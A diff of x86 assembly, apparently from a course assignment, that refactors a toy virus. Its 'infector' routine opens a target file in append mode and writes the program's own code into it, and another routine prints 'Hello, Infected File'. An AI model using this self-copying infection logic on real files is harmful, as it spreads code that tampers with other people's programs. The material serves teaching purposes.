@@ -1,11 +1,19 @@
 section .data
-    message: dd "Hello, Infected File", 10
-global infector
+    virus: dd "Hello, Infected File", 10, 0
+    DummyStr_Str1:
+STDOUT EQU 1
+WRITE EQU 4
+OPEN EQU 5
+CLOSE EQU 6
+FILE_PER EQU 0777
+EDIT EQU 1024
 global infection
 global code_end
+global infector
 global _start
-global system_call
 global code_start
+global system_call
+
 extern main
 
 section .text
@@ -16,49 +24,60 @@ infection:
     push    ebp
     mov     ebp, esp
     sub     esp, 4
-    push    21  ;the length of message
-    push    message ; the buffer
-    push    1       ; stdout
-    push    4       ; write command
-    call    system_call   ; use the system call
-    add     esp, 4
+    mov     edx, DummyStr_Str1 - virus -1 ;trick from class
+    push    virus
+    push    STDOUT
+    push    WRITE
+    call    system_call   ; use the system call as directed in the assigment
+    add     esp, 4 ;remove write
+    add     esp, 4 ;remove stdout
+    add     esp, 4 ;remove virus
     mov     esp, ebp
     pop     ebp
     ret
+
+open_file:
+	push FILE_PER               ;
+	push EDIT | 1           ; edit mode append or write
+	mov eax, [ebp + 8]      ; file path to eax
+	push eax                ; push file path
+	push OPEN                 ; system call open
+	call system_call
+	add esp, 4              ;remove open
+	add esp, 4              ;remove filepath
+	add esp, 4              ;remove edit
+	add esp, 4              ;remove permission
+	push eax                ; push file path
+	jmp write_file
+
 
 infector:
     push    ebp
     mov     ebp, esp
 	pushad
+	jmp open_file
 
-; we saw how to open/close  file from stackOverFlow
-
-open:
-	push 0777               ; file permissions
-	push 1024 | 1           ; edit mode append or write
-	mov eax, [ebp + 8]      ; file path to eax
-	push eax                ; push file path
-	push 5                  ; system call open
-	call system_call
-	add esp, 16
-	push eax                ; push file path
-
-write:
-	push code_end - code_start      ; num of bytes to write
-	push code_start                 ; where to start reading
-	push eax                        ; push file path
-	push 4                          ; system call write
-	call system_call
-	add esp, 16
-
-close:
-	push 6                          ; system call close
+close_file:
+	push CLOSE
 	call system_call
 	add esp, 8
 	popad
 	mov esp, ebp
 	pop ebp
 	ret
+
+write_file:
+	push code_end - code_start      ; num of bytes to write
+	push code_start                 ; where to start reading
+	push eax                        ; push file path
+	push WRITE                       ; system call write
+	call system_call
+	add esp, 4                       ; remove system call
+	add esp, 4                       ;remove write
+	add esp, 4                         ;remove path
+	add esp, 4                         ;remove num of bytes
+	jmp close_file
+
 code_end:
 
 _start:
